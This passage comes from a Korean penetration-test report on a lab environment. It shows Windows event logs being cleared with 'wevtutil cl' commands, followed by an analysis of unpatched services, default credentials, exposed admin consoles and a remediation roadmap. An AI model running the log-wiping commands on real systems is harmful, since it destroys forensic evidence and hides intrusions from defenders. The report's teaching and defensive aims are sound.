![wdhcp2](/assets/images/att-ck/14.1.2.dhcp.png)

### 14.2. 흔적 제거 (T1070.001)

*   **기술 분석 (T1070.001: Indicator Removal on Host: Clear Windows Event Logs):** 공격의 흔적을 지워 포렌식 분석을 방해하고 침해 사실 인지를 지연시키는 것은 공격자의 주요 목표 중 하나이다. Windows 이벤트 로그는 로그인 시도, 권한 상승, 프로세스 실행, 시스템 설정 변경 등 공격자의 모든 행위를 기록하는 핵심적인 증거이다. `wevtutil.exe`는 Windows에 내장된 합법적인 관리 도구로, 이벤트 로그를 조회, 내보내기, 보관 및 삭제하는 기능을 제공한다. 공격자는 이 'Living off the Land' 도구를 악용하여 자신의 침입 및 활동 기록을 깨끗이 삭제한다.
*   **공격 검증:**
    1.  `SYSTEM` 권한을 획득한 셸에서 다음 명령어들을 순차적으로 실행했다.
        *   `wevtutil cl Security`: 로그인 성공/실패, 권한 사용 등 보안 관련 감사가 기록되는 가장 중요한 '보안 로그'를 삭제한다.
        *   `wevtutil cl System`: 시스템 시작/종료, 서비스 상태 변경 등 시스템 관련 이벤트가 기록되는 '시스템 로그'를 삭제한다.
        *   `wevtutil cl Application`: 응용 프로그램의 동작 및 오류가 기록되는 '응용 프로그램 로그'를 삭제한다.
    2.  명령 실행 후, 대상 서버에서 `eventvwr.msc`를 실행하여 이벤트 뷰어를 열고 각 로그(보안, 시스템, 응용 프로그램)를 확인한 결과, 모든 이벤트 기록이 삭제되고 비어있는 것을 확인했다. (경우에 따라 로그가 삭제되었다는 이벤트 하나만 남을 수 있다.)
*   **영향 분석:** 이벤트 로그 삭제는 방어 팀(Blue Team)과 사고 대응 전문가의 눈을 가리는 행위와 같다. 공격자가 언제, 어떻게 침입했는지, 어떤 계정을 탈취했는지, 어떤 시스템에 추가로 접근했는지, 어떤 데이터를 유출했는지에 대한 핵심적인 단서가 모두 사라진다. 이로 인해 침해사고의 범위와 피해를 정확히 파악하는 것이 매우 어려워지며, 대응 및 복구 프로세스가 크게 지연되고, 재발 방지 대책을 수립하는 데 심각한 차질이 발생한다. 이는 중앙 집중화된 로그 관리 시스템(SIEM)과 삭제가 불가능한(Immutable) 로그 저장소의 필요성을 명확히 보여준다.

![wlog1](/assets/images/att-ck/14.2.1.log.png)
![wlog2](/assets/images/att-ck/14.2.2.log.png)

* * *
{:.short-rule}

## 15. 종합 분석 및 대응 방안 {#conclusion}

### 15.1. 종합 분석: 개별 취약점을 관통하는 구조적 문제점

본 모의 침투를 통해 드러난 개별 취약점들은 독립적인 사건이 아니라, 조직의 보안 관리 체계에 깊이 내재된 다음과 같은 구조적인 문제점에서 비롯된 필연적인 결과이다. 각 문제점은 공격자가 침투부터 목표 달성까지의 **전체 공격 흐름(Attack Flow)**을 완성하는 데 결정적인 역할을 했다.

*   **문제점 1: 방치된 취약점 관리 프로세스 (Running Unpatched Services)**
    *   **현상 분석:** Windows 서버의 **MS17-010 (EternalBlue)**, Ubuntu 서버의 **UnrealIRCd 백도어(CVE-2010-2075)**, **Apache Drupal RCE**, **CUPS Shellshock(CVE-2014-6271)** 등은 이미 수년 전에 공개되어 공격 코드가 널리 알려지고 자동화된 공격 도구까지 존재하는 치명적인 취약점들이다. 이러한 취약점들이 아무런 조치 없이 방치되어 있었다는 것은, 시스템 자산에 대한 정기적인 취약점 스캔, 위험 평가, 그리고 패치 적용으로 이어지는 기본적인 '취약점 관리 라이프사이클'이 전혀 작동하지 않고 있음을 의미한다.
    *   **공격자 관점의 의미:** 이는 공격자에게 인증 절차조차 필요 없는, 원격에서 시스템 최고 권한을 즉시 획득할 수 있는 '고속도로'를 열어준 것과 같다. 공격자는 복잡한 제로데이 공격 없이도 널리 알려진 공개 익스플로잇 코드 하나만으로 초기 발판을 손쉽게 마련할 수 있었다.

*   **문제점 2: 부재한 초기 보안 설정(Hardening) 및 패스워드 정책 (Use of Weak Default Accounts)**
    *   **현상 분석:** **Apache Tomcat(`sploit:sploit` 추정)**, **Oracle GlassFish(`admin:sploit` 추정)**, **SSH(`vagrant:vagrant`)**, **FTP(`vagrant:vagrant`)** 등 다수의 핵심 서비스에서 제조사 기본값이거나 극도로 취약한 자격증명이 그대로 사용되고 있었다. 이는 시스템이나 애플리케이션을 설치할 때 초기 보안 설정(Hardening) 절차가 전혀 없으며, 전사적인 패스워드 복잡도 및 변경 주기 정책이 부재함을 명백히 보여준다.
    *   **공격자 관점의 의미:** 공격자는 `rockyou.txt`와 같은 일반적인 사전 파일을 이용한 무차별 대입 공격(Brute-force)만으로 다수의 서비스 접근 권한을 획득했다. 이는 마치 모든 현관문에 '1234'와 같은 공통 비밀번호를 사용하는 것과 같아, 공격자에게 시스템에 들어갈 수 있는 '정문'을 여러 개 열어준 셈이다.

*   **문제점 3: 기능 오남용을 방치하는 미흡한 애플리케이션 보안 (Exploitation of Service Functions and Misconfiguration)**
    *   **현상 분석:** **Jenkins의 인증 없는 스크립트 콘솔**은 공격자에게 `SYSTEM` 권한을 즉시 제공하는 결정적인 권한 상승 경로가 되었다. **WebDAV의 익명 파일 업로드** 기능은 웹 셸을 통한 RCE 공격의 직접적인 원인이 되었다. 또한 **MySQL 인증 우회(CVE-2012-2122)**와 같은 구현 상의 결함은 데이터베이스에 대한 완전한 접근 권한을 허용했다.
    *   **공격자 관점의 의미:** 이는 "보안은 가장 약한 연결고리만큼만 강하다"는 원칙을 명확히 보여준다. 각 서비스가 제공하는 강력하고 편리한 기능들이 보안적인 관점에서 검토되지 않고 기본 설정 그대로 운영될 때, 이 기능들은 공격자에게 가장 강력한 무기가 된다. 공격자는 방화벽이나 네트워크 보안을 우회하여 애플리케이션의 '합법적인 기능'을 악용해 시스템을 장악했다.

*   **문제점 4: 경계가 무너진 네트워크 아키텍처 (Broad Attack Surface and Inadequate Network Segregation)**
    *   **현상 분석:** FTP, SSH, SMB, Java-RMI, 각종 웹 관리 페이지(Jenkins, GlassFish, Tomcat) 등 비즈니스 목적상 외부에 공개될 필요가 없는 수많은 서비스 포트가 외부(공격자)에게 직접 노출되어 있었다. 또한, Windows 서버에서 탈취한 SSH 키가 Ubuntu 서버에 재사용되어 손쉬운 **횡적 이동**이 가능했다.
    *   **공격자 관점의 의미:** 이는 공격자에게 다양한 공격 벡터를 시도할 수 있는 '넓은 공격 표면(Attack Surface)'을 제공한다. 또한, 한번 내부 시스템 하나가 침해당했을 때 다른 시스템으로 확산되는 것을 막아줄 네트워크 격리(Segmentation)가 부재하여, 공격자는 내부망을 마치 자신의 안방처럼 자유롭게 활보할 수 있었다.

### 15.2. 보안 강화 로드맵: 단계별 개선 방안

상기 문제점들을 해결하고 지속 가능한 보안 체계를 구축하기 위해, 다음과 같은 단계별 개선 방안을 제안한다.

#### [긴급] 즉시 조치 사항 (24시간 내 수행 권고)

*   **치명적 취약점 즉시 패치 (문제점 1 대응):**
    *   **조치:** 본 보고서에서 식별된 모든 'Critical' 등급의 원격 코드 실행 취약점(MS17-010, UnrealIRCd 백도어, Drupal Coder 모듈 RCE, Elasticsearch RCE, Shellshock 등)에 대해 벤더사가 제공하는 최신 보안 패치를 즉시 적용하거나, 서비스 버전을 업그레이드한다. 패치가 불가능할 경우, 해당 서비스를 즉시 중지해야 한다.

*   **취약 계정 즉시 조치 (문제점 2 대응):**
    *   **조치:** Tomcat, GlassFish, SSH, FTP 등 모든 서비스의 기본 계정 및 `vagrant`와 같은 취약한 계정의 암호를 복잡도(대/소문자, 숫자, 특수문자 조합 12자 이상)를 충족하는 강력한 암호로 즉시 변경한다. 사용하지 않는 계정은 비활성화하거나 삭제한다.

#### [중기] 인프라 방어 강화 (3개월 내 수행 권고)

*   **네트워크 접근 제어 강화 (Attack Surface 축소) (문제점 4 대응):**
    *   **조치:** 'Deny All, Permit by Exception' 원칙 하에 외부 및 내부 방화벽 정책을 전면 재수립한다. 특히 SSH(22), RMI(1617), Jenkins(8484), GlassFish 관리(4848), Tomcat 관리(8282) 등 모든 관리용 서비스는 지정된 내부 관리망 IP 대역에서만 접근 가능하도록 엄격히 제한하고, 외부에서는 접근을 원천 차단한다.

*   **시스템 및 애플리케이션 보안 강화(Hardening) (문제점 3 대응):**
    *   **조치:** Jenkins의 공용 스크립트 콘솔과 같이 불필요하게 노출된 위험 기능을 비활성화하고 반드시 인증을 거치도록 설정을 변경한다. WebDAV 서비스는 익명 쓰기 권한을 제거하고, 파일 업로드 기능이 있는 모든 웹 애플리케이션은 확장자 화이트리스트 정책(예: `.jpg`, `.png`, `.pdf`만 허용)을 적용하여 `jsp, war, php` 등 실행 가능한 파일의 업로드를 원천적으로 차단한다.

#### [장기] 지속 가능한 보안 체계 구축 (1년 내 구축 목표)

*   **정기적인 취약점 관리 프로세스 수립 (문제점 1, 3 대응):**
    *   **조치:** '전사 자산 식별 → 정기 자동 스캔(Nessus/GVM) → 위험도 평가 및 우선순위 결정 → 패치 및 조치 → 조치 검증'으로 이어지는 정기적인 취약점 관리 프로세스를 수립하고, 월간 또는 분기별 스캔 및 조치를 의무화한다.

*   **전사적인 자격증명 관리 정책 수립 및 감사 (문제점 2 대응):**
    *   **조치:** 강력한 암호 정책(복잡도, 주기적 변경, 재사용 금지)을 전사에 강제하고, SSH 키와 같은 민감한 인증서는 중앙에서 안전하게 관리하며, 주기적인 감사를 통해 정책 준수 여부를 점검한다. 더 나아가, 중요 시스템에는 다단계 인증(MFA) 도입을 의무화하여 자격 증명 탈취 공격의 위협을 근본적으로 완화한다.

*   **보안 관제 및 사고 대응 체계 구축 (문제-전반 대응):**
    *   **조치:** 모든 중요 시스템(서버, 네트워크 장비, 보안 솔루션)의 로그를 중앙 로그 관리 시스템(SIEM)으로 실시간 전송하여 위변조를 방지한다. '다중 로그인 실패', '비정상적인 관리자 페이지 접근', '이벤트 로그 삭제 시도', 'Powershell 악성 스크립트 실행 패턴' 등 핵심 공격 징후에 대한 탐지 규칙을 적용하여 침해 시도를 조기에 탐지하고, 정의된 절차에 따라 신속하게 대응하는 체계를 구축한다.

{:.short-rule}
* * *